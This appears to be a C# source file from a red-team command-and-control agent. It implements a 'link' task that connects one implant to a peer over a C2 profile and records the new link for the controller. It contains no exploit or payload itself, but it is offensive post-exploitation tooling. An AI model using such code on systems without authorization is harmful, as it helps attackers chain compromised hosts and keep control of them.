using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;

namespace Tasks
{
    public class link : Tasking
    {
        [DataContract]
        internal struct LinkParameters
        {
            [DataMember(Name = "connection_info")]
            public PeerInformation ConnectionInfo;
        }

        public link(IAgent agent, Task task) : base(agent, task)
        {
            
        }

        public override void Kill()
        {
            throw new NotImplementedException();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                ApolloInterop.Classes.P2P.Peer p = null;
                try
                {
                    LinkParameters parameters = _jsonSerializer.Deserialize<LinkParameters>(_data.Parameters);
                    p = _agent.GetPeerManager().AddPeer(parameters.ConnectionInfo);
                    p.UUIDNegotiated += (object _, UUIDEventArgs args) =>
                    {
                        resp = CreateTaskResponse(
                        $"Established link to {parameters.ConnectionInfo.Hostname}",
                        true,
                        "completed",
                        new IMythicMessage[1]
                        {
                        new EdgeNode()
                        {
                            Source = _agent.GetUUID(),
                            Destination = p.GetMythicUUID(),
                            Direction = EdgeDirection.SourceToDestination,
                            Action = "add",
                            C2Profile = parameters.ConnectionInfo.C2Profile.Name,
                            MetaData = ""
                        }
                        });
                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                    };
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse(
                        $"{ex.StackTrace}\n\nFailed to establish connection. Reason: {ex.Message}",
                        true,
                        "error");
                    if (p != null)
                    {
                        _agent.GetPeerManager().Remove(p);
                    }
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                }
            }, _cancellationToken.Token);
        }
    }
}
